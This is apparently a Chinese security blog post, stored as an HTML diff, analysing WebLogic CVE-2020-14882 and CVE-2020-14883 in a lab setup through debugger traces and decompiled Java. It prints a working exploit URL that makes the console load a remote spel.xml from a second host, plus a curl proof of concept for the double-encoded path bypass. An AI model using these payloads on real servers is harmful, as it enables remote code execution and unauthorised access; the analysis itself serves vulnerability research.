@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,weblogic," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言实际上这是一个组合漏洞利用的姿势，分别是CVE-2020-14882 console代码执行和CVE-2020-14883 权限绕过，本文将依次展开对这两个漏洞的复现分析。 实验环境实验环境用的是前面的weblogic环境，weblogic版本是10.3.6，jdk版本是7，然后使用idea开远程调试。 CVE-2020-14882这个漏洞的成因主要是没有限制handler的初始化。 1htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogicConsoleHttp远程代码执行复现">
+<meta property="og:url" content="http://www.star123.top/2021/01/18/weblogicConsoleHttp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言实际上这是一个组合漏洞利用的姿势，分别是CVE-2020-14882 console代码执行和CVE-2020-14883 权限绕过，本文将依次展开对这两个漏洞的复现分析。 实验环境实验环境用的是前面的weblogic环境，weblogic版本是10.3.6，jdk版本是7，然后使用idea开远程调试。 CVE-2020-14882这个漏洞的成因主要是没有限制handler的初始化。 1htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/YN4QTxD2uZlnBf6.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/18/Axj3EyFSJWdw5sg.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/NJbtQgWOIv8s4GE.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/nCs4wjze839BcSx.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/WSVeKL4TgJiQCyp.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/qWJkPtcDrKsCXuN.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/24/kwC2cG7NThHdysD.png">
+<meta property="article:published_time" content="2021-01-18T11:58:36.000Z">
+<meta property="article:modified_time" content="2021-01-24T04:18:35.672Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="weblogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/01/24/YN4QTxD2uZlnBf6.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2021/01/18/weblogicConsoleHttp远程代码执行复现/"/>
+
+
+
+
+
+  <title>weblogicConsoleHttp远程代码执行复现 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2021/01/18/weblogicConsoleHttp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">weblogicConsoleHttp远程代码执行复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-18T19:58:36+08:00">
+                2021-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上这是一个组合漏洞利用的姿势，分别是CVE-2020-14882 console代码执行和CVE-2020-14883 权限绕过，本文将依次展开对这两个漏洞的复现分析。</p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>实验环境用的是前面的weblogic环境，weblogic版本是10.3.6，jdk版本是7，然后使用idea开远程调试。</p>
+<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>这个漏洞的成因主要是没有限制<strong>handler</strong>的初始化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.2:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http:&#x2F;&#x2F;10.211.55.2:8000&#x2F;spel.xml%22)</span><br></pre></td></tr></table></figure>
+
+<p>断点下在<strong>FileSystemXmlApplicationContext</strong>的22行，看调用链。</p>
+<p><img src="https://i.loli.net/2021/01/24/YN4QTxD2uZlnBf6.png" alt="image-20210124120739658"></p>
+<p><strong>com.bea.console.utils.BreadcrumbBacking</strong>类的<strong>init</strong>方法会调用<strong>findFirstHandle</strong>来获取参数，其中参数名字包括<strong>handle</strong>就会将该参数的值传入<strong>getHandle</strong>方法做后续处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parmName.indexOf(REQUEST_CONTEXT_VALUE) != -<span class="number">1</span>) &#123;</span><br><span class="line">                handle = parm;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要问题在<strong>com.bea.console.handles.HandleFactory</strong>类的<strong>getHandle</strong>方法，大致逻辑就是括号前的内容作为类名，括号中的内容作为字符串参数，然后执行反射初始化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Handle <span class="title">getHandle</span><span class="params">(String serializedObjectID)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmptyString(serializedObjectID)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidParameterException(<span class="string">"No serialized object string specified"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            serializedObjectID = serializedObjectID.replace(<span class="string">'+'</span>, <span class="string">' '</span>);</span><br><span class="line">            String serialized = HttpParsing.unescape(serializedObjectID, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">int</span> open = serialized.indexOf(<span class="number">40</span>);</span><br><span class="line">            <span class="keyword">if</span> (open &lt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidParameterException(<span class="string">"Syntax error parsing serializedObjectID string: "</span> + serialized);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String className = serialized.substring(<span class="number">0</span>, open);</span><br><span class="line">                String objectIdentifier = serialized.substring(open + <span class="number">2</span>, serialized.length() - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class handleClass = Class.forName(className);</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> Object[]&#123;objectIdentifier&#125;;</span><br><span class="line">                    Constructor handleConstructor = handleClass.getConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    <span class="keyword">return</span> (Handle)handleConstructor.newInstance(args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var8) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidParameterException(<span class="string">"No handle class found for type: "</span> + className);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidParameterException(<span class="string">"Unable to instanciate handle type: "</span> + className, var9);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较玄学的是自己调的过程中发现<strong>_nfpb</strong>和<strong>_pageLabel</strong>参数都是不用加的。</p>
+<h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><ol>
+<li>首先使用poc，断点下在<strong>BreadcrumbBacking</strong>的209行。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;10.211.55.2:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252Fconsole.portal</span><br></pre></td></tr></table></figure>
+
+<p>![image-20210118201913993](../../../../../Library/Application Support/typora-user-images/image-20210118201913993.png)</p>
+<p>看下调用栈，需要注意的点</p>
+<p><img src="https://i.loli.net/2021/01/18/Axj3EyFSJWdw5sg.png" alt="image-20210118203507697"></p>
+<p><strong>securedExecute</strong>函数中调用<strong>checkAccess</strong>函数，可能针对访问路由进行了校验，在<strong>checkAccess</strong>处下个断点看看。在渲染前，需要对访问的文件鉴权。这里使用<strong>getConstraint</strong>方法获取访问路径对应的权限组。</p>
+<p><img src="https://i.loli.net/2021/01/24/NJbtQgWOIv8s4GE.png" alt="image-20210124100718821"></p>
+<p>这里跟入<strong>getConstraint</strong>方法，在该方法中，首先需要从<strong>constraintsMap</strong>中取出对应的<strong>standardURLMapping</strong>，不同的请求方法可以对应的<strong>standardURLMapping</strong>是不同的，分别在<strong>paramString2</strong>为空和不为空的情况下获取<strong>standardURLMapping</strong>，而此时<strong>constraintsMap</strong>仅仅有一个键值*<em>“”<strong>，在获取</strong>standardURLMapping<strong>，获取匹配的请求路径。这里的对应关系是</strong>/css/%252e%252e%252Fconsole.portal<strong>对应</strong>/css/**</em>，相当于我们在访问**/css**目录下的静态资源。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ResourceConstraint <span class="title">getConstraint</span><span class="params">(String paramString1, String paramString2)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.constraintsMap == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">     </span><br><span class="line">     StandardURLMapping standardURLMapping = <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">       standardURLMapping = (StandardURLMapping)<span class="keyword">this</span>.constraintsMap.get(paramString2);</span><br><span class="line">       <span class="keyword">if</span> (standardURLMapping != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ResourceConstraint resourceConstraint = (ResourceConstraint)standardURLMapping.get(paramString1);</span><br><span class="line">         <span class="keyword">if</span> (resourceConstraint != <span class="keyword">null</span>) <span class="keyword">return</span> resourceConstraint; </span><br><span class="line">       &#125; </span><br><span class="line">      <span class="keyword">return</span> getConstraint(paramString1, <span class="keyword">null</span>);</span><br><span class="line">     &#125; </span><br><span class="line">     standardURLMapping = (StandardURLMapping)<span class="keyword">this</span>.constraintsMap.get(<span class="string">""</span>);</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span> (standardURLMapping == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">return</span> (ResourceConstraint)standardURLMapping.get(paramString1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/24/nCs4wjze839BcSx.png" alt="image-20210124101834891"></p>
+<p>之后看鉴权的部分，这里需要注意的是要提前在<strong>WebAppSecurityWLS</strong>类的<strong>hasPermission</strong>方法出下断点，不然可能跟不到。直接看到<strong>hasPermission</strong>方法，这里放行的其中一个条件是<strong>paramResourceConstraint</strong>的<strong>unrestricted</strong>为<strong>true</strong>，访问静态资源时该值均为<strong>true</strong>。因此通过鉴权。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (paramResourceConstraint == <span class="keyword">null</span> || paramResourceConstraint.isUnrestricted()) <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在完成鉴权后，最大的一个问题是为何指向*<em>/css/**</em>的路径最后会指向*<em>/\</em>.console.portal<strong>，这时，将断点下在</strong>UIServlet<strong>的128行处。程序会调用</strong>createUIContext**来完成渲染，之后依次跟入以下方法。</p>
+<p><img src="https://i.loli.net/2021/01/24/WSVeKL4TgJiQCyp.png" alt="image-20210124111728244"></p>
+<p>在<strong>getTree</strong>方法中有这样一段逻辑，会将传入的请求解码，这里就是需要对payload进行二次编码的理由。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UIControl <span class="title">getTree</span><span class="params">(String requestPattern, UIContext ctxt, <span class="keyword">boolean</span> setContentType, ResolvedLocale resolvedLocale)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        requestPattern = URLDecoder.decode(requestPattern, containerServices.getWebappServices().getServerDefaultEncoding());</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在跟<strong>getMergedControlFromFile</strong>方法时需要注意，获得的资源如果被缓存过的话需要重新启动服务器来清除缓存，最终调用栈如下：</p>
+<p><img src="https://i.loli.net/2021/01/24/qWJkPtcDrKsCXuN.png" alt="image-20210124114438156"></p>
+<p>可能是<strong>weblogic</strong>版本的问题所以跟起来和参考的文章不太一样，最终是在<strong>ZipClassFinder</strong>的<strong>getSource</strong>方法处理了相对路径，从而造成目录穿越。</p>
+<p><img src="https://i.loli.net/2021/01/24/kwC2cG7NThHdysD.png" alt="image-20210124114547506"></p>
+<p>之后获取的到相应文件后会解析模板，最后定位到管理页面。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>还是很好奇作者是如何挖出来的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4</a></li>
+<li><a href="https://xz.aliyun.com/t/8470#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/8470#toc-1</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/weblogic/" rel="tag"># weblogic</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/16/duxcms3-1-3%E5%AE%A1%E8%AE%A1/" rel="next" title="duxcms3.1.3审计">
+                <i class="fa fa-chevron-left"></i> duxcms3.1.3审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-14882"><span class="nav-number">3.</span> <span class="nav-text">CVE-2020-14882</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-14883"><span class="nav-number">4.</span> <span class="nav-text">CVE-2020-14883</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思考"><span class="nav-number">5.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
